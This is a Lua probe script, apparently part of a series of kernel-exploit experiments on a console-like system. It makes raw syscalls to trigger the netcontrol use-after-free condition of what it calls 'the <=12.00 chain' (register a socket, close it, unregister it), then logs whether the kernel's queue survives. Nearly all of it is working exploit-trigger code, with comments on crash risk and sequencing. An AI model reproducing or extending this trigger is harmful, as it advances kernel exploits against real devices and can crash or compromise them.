-- CRASH_CLASS: HIGH
-- PROBE 222a: netcontrol, the close-then-unregister trigger on a clean queue
--
-- Context: 219a registered fd 28, closed it while registered, let a new socket
-- take the same number, and then unregistered -> -1. Every later netcontrol
-- call in that process returned -1, including plain registers on freshly opened
-- descriptors (220a, 221a), so the failed unregister left the queue in a state
-- no later call could clear.
--
-- That also means 220a never measured its own trigger: it ran after 219a had
-- already wedged the queue, so its "register -1" lines are effects, not results.
-- The no-reclaim case has to be the *first* netcontrol call in a process.
--
-- This probe is that run, in order of information:
--
--   [A] control - register and unregister one open descriptor. It must return 0
--       for either, otherwise the process is not clean and [B] is worthless.
--   [B] the trigger - register, close, unregister with nothing reclaiming the
--       number. Nothing else has touched the queue in this process.
--   [C] after the trigger, does a fresh descriptor still register? A -1 here
--       means the queue is one-shot per process once a registration is orphaned.
--
-- RISK: [B] is the use-after-free condition of the <=12.00 chain, with no spray
-- and no reclaim. A panic needs a power cycle.

print("=== PROBE 222a: netcontrol close-then-unregister ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u64(v)
    if type(v) == "number" then return uint64(string.format("0x%08X", v)) end
    return v
end
local function sgn(v)
    if v == nil then return "killed" end
    if v >= 0x80000000 then return tostring(v - 0x100000000) end
    return tostring(v)
end
local dead = false

local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0), u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then
        dead = true
        return nil, nil
    end
    return ret, to_num(ret)
end

local BUF = memory.alloc(0x20)
local function zero(addr, n)
    for i = 0, n - 1, 4 do
        pcall(function() memory.write_dword(addr + i, 0) end)
    end
end
local function wd(addr, v)
    return (pcall(function() memory.write_dword(addr, v) end))
end

local SET_QUEUE = 0x20000003
local CLEAR_QUEUE = 0x20000007
local RETIRED = 0xFFFFFFFF

local function pid()
    local _, v = call(20)
    return sgn(v)
end

local function reg(fd, cmd)
    zero(BUF, 0x10)
    wd(BUF, fd)
    local _, v = call(99, RETIRED, cmd, BUF, 8)
    return v
end

print("    pid " .. pid())
print("")

print("[A] control on this process: register and unregister one open descriptor")
local _, afd = call(97, 1, 1, 0)
local a1, a2
if afd ~= nil and afd >= 0 then
    a1 = reg(afd, SET_QUEUE)
    a2 = reg(afd, CLEAR_QUEUE)
    print(string.format("    fd %s  register %s  unregister %s", sgn(afd), sgn(a1), sgn(a2)))
    call(6, afd)
end
print("")

if a1 == 0 and a2 == 0 then
    print("[B] trigger: register, close, unregister with nothing reclaiming it")
    local _, bfd = call(97, 1, 1, 0)
    print("    fd " .. sgn(bfd))
    if bfd ~= nil and bfd >= 0 and not dead then
        print("    register -> " .. sgn(reg(bfd, SET_QUEUE)))
        if not dead then
            local _, bc = call(6, bfd)
            print("    close    -> " .. sgn(bc))
        end
        if not dead then
            print("    pid before -> " .. pid())
            local b3 = reg(bfd, CLEAR_QUEUE)
            print("    unregister -> " .. sgn(b3))
            print("    pid after  -> " .. pid())
        end
    end
    print("")

    print("[C] is the queue still usable afterwards")
    local _, cfd = call(97, 1, 1, 0)
    if cfd ~= nil and cfd >= 0 and not dead then
        print(string.format("    fd %s register -> %s", sgn(cfd), sgn(reg(cfd, SET_QUEUE))))
        print(string.format("    fd %s unregister -> %s", sgn(cfd), sgn(reg(cfd, CLEAR_QUEUE))))
        call(6, cfd)
    end
    print("    pid -> " .. pid())
else
    print("[B] skipped: the control did not pass, so this process is not clean")
end
print("")
print("=== PROBE 222a COMPLETE ===")
